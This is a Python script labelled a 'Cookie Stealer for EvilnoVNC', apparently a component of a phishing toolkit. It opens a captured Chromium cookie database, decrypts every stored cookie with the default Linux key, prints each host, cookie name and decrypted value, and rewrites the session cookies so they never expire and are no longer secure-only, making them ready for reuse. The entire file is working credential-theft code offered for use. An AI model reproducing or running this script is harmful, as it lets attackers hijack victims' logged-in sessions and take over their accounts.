# Cookie Stealer for EvilnoVNC
# Code from: https://www.thepythoncode.com/article/extract-chrome-cookies-python
# Decrypt function from: https://n8henrie.com/2014/05/decrypt-chrome-cookies-with-python

import os
import json
import base64
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def decrypt_cookies(encrypted_value):
    # Function to get rid of padding
    def clean(x):
        if len(x) < 1:
            # if there aren't enough bytes...
            return '' 
        return x[:-x[-1]].decode('utf8')

    # Trim off the 'v10' that Chrome/ium prepends
    encrypted_value = encrypted_value[3:]

    # Default values used by both Chrome and Chromium in OSX and Linux
    salt = b'saltysalt'
    iv = b' ' * 16
    length = 16

    # On Mac, replace MY_PASS with your password from Keychain
    # On Linux, replace MY_PASS with 'peanuts'
    my_pass = 'peanuts'
    my_pass = my_pass.encode('utf8')

    # 1003 on Mac, 1 on Linux
    iterations = 1

    key = PBKDF2(my_pass, salt, length, iterations)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    decrypted = cipher.decrypt(encrypted_value)
    decrypted_value = (clean(decrypted))
    return decrypted_value

def main():
    # local sqlite Chrome cookie database path
    filename = "Downloads/Default/Cookies"
    # connect to the database
    db = sqlite3.connect(filename)
    # ignore decoding errors
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # get the cookies from `cookies` table
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    # you can also search by domain, e.g thepythoncode.com
    # cursor.execute("""
    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    # FROM cookies
    # WHERE host_key like '%thepythoncode.com%'""")
    # get the AES key
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_cookies(encrypted_value)
        else:
            # already decrypted
            decrypted_value = value
        print(f"""
Host: {host_key}
Cookie name: {name}
Cookie value (decrypted): {decrypted_value}
Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
===============================================================""")
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    db.commit()
    # close connection
    db.close()

if __name__ == "__main__":
    main()